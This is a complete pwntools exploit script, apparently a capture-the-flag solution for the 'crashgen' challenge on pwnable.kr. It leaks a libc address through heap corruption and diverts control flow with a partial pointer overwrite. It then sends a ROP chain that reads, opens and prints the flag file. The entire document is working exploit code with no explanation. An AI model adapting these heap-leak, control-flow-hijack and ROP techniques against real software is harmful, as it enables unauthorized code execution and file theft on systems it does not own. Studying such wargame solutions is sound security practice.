from pwn import *
elf = context.binary = ELF("./crashgen", checksec=False)
#libc = ELF("./libc-2.23.so",checksec=False)
libc = ELF("./nuevo/libc-2.23.so",checksec=False)

def delete(idx):
    io.sendlineafter(b"idx?\n",b"2")
    io.sendlineafter(b"idx?\n",idx)

def add(payload):
    io.sendlineafter(b"idx?\n",b"1")
    io.sendlineafter(b"add?\n",payload)
    io.sendline(b"88888") # delete after

def edit(idx, payload):
    io.sendlineafter(b"idx?\n",b"3")
    io.sendlineafter(b"idx?\n",str(idx).encode())
    io.sendlineafter(b"edit how?\n",payload)

def bug(payload):
    io.sendlineafter(b"idx?",b"31337")
    io.sendlineafter(b"bug?",payload)

def print_list():
    io.sendlineafter(b"idx?",b"3")
    io.sendlineafter(b"idx?",b"999999")

def overwrite_n_and_jmp(offset,part,address):
    # Segfault! go to CrashReport
    io.sendline(b"n")
    io.sendline(b"y")  
    # Partial arbitrary write -> partial overwrite of n bytes
    io.send(f"{offset-(8-part)}".encode()+b"\x00")
    io.send(hex(address)[part:].encode()+b"\x00")

#io = remote("0.0.0.0",9045)
io = remote("pwnable.kr",10032)

# Phase 1: Put the top chunk in the unsorted bin
io.info("Leaking libc...")

io.recvuntil(b"sentence?\n")
io.sendline(b"A " * 37 +  b"B"*24)
edit(37, b"B"*24 + b"\x71\x06")
delete(b"9"*0x1000)

# Phase 2: Leak libc address
add(b"\x00")
[io.recvline() for _ in range(40)]
libc_leak = u64(io.recvline().strip()[1:-1].ljust(8,b'\x00'))
libc.address = libc_leak - 0x3c4b78

io.info(f"Libc base address: {hex(libc.address)}")

# Phase 3: Cause segfault with delete() and ret2program
io.info("Deleting tokens...")

io.sendline(b" ")
for _ in range(39):
    delete(b"1")

# jmp to bug()
io.info("jumping to bug()...")
overwrite_n_and_jmp(-0x148,2,0x1689 << 6*8)
io.recvuntil(b"for the fix?\n")

# Phase 4: ROP
rop = ROP(libc)
io.info("ROPing...")
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret']).address
pop_rdx_rsi_ret = rop.find_gadget(['pop rdx', 'pop rsi', 'ret']).address
pop_r8_ret = libc.address + 0x135136 
flagstr_addr = libc.address + 0x3c5f00

# offset
payload = b"A" * 119
# read(stdin, libc_writable_address, 32)
payload += p64(pop_rdi_ret) + p64(0)
payload += p64(pop_rdx_rsi_ret) + p64(32) +p64(flagstr_addr)
payload += p64(libc.sym['read'])
# open("flag.txt", O_RDONLY, 0)
payload += p64(pop_rdi_ret) + p64(flagstr_addr)
payload += p64(pop_rdx_rsi_ret) + p64(0) * 2
payload += p64(libc.sym['open'])
# sendfile(stdout, file_fd, 0, 32)
payload += p64(pop_rdi_ret) + p64(1)
payload += p64(pop_rdx_rsi_ret) + p64(0) + p64(4)
payload += p64(pop_r8_ret) + p64(32)
payload += p64(libc.sym['sendfile'])
# exit(0)
payload += p64(pop_rdi_ret) + p64(0)
payload += p64(libc.sym['exit'])

# send ROPchain
io.send(payload)
# send flag path
io.send(b"flag\x00")
io.success(io.recvall().decode())
